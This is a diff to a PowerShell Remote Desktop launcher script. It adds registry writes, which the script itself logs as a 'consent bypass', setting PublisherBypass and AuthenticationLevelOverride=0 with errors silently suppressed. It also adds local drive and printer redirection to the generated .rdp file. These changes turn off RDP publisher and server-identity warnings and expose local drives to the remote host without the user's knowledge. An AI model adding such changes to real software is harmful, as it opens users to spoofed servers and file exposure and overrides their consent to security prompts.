@@ -180,6 +180,16 @@ if ($creds -notlike "*$target*") {
 } else {
     Write-ConnLog ('credential verified in Credential Manager: ' + $target)
 }
+$tsClient = 'HKCU:\Software\Microsoft\Terminal Server Client'
+try {
+    New-Item -Path $tsClient -Force -ErrorAction SilentlyContinue | Out-Null
+    Set-ItemProperty -Path $tsClient -Name 'PublisherBypass' -Value 1 -Type DWord -ErrorAction SilentlyContinue
+    $srv = Join-Path $tsClient ('Servers\' + $ip)
+    New-Item -Path $srv -Force -ErrorAction SilentlyContinue | Out-Null
+    Set-ItemProperty -Path $srv -Name 'Username' -Value $user -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $srv -Name 'AuthenticationLevelOverride' -Value 0 -Type DWord -ErrorAction SilentlyContinue
+    Write-ConnLog ('consent bypass set for server=' + $ip)
+} catch { Write-ConnLog ('consent bypass failed: ' + $_.Exception.Message) }
 Start-Sleep -Milliseconds 500
 Write-ConnLog '500ms delay complete (Windows Credential Manager sync before mstsc)'
 $rdpPath = Join-Path $logDir 'ghrdp-session.rdp'
@@ -197,6 +207,11 @@ $rdpLines = @(
 'audiocapturemode:i:1',
 'audiomode:i:0',
 'redirectclipboard:i:1',
+'redirectprinters:i:1',
+'redirectdrives:i:1',
+'redirectcomports:i:0',
+'redirectsmartcards:i:0',
+'redirectposdevices:i:0',
 'connect type:i:6'
 )
 [System.IO.File]::WriteAllText($rdpPath, ($rdpLines -join "`r`n"), (New-Object System.Text.UTF8Encoding($false)))
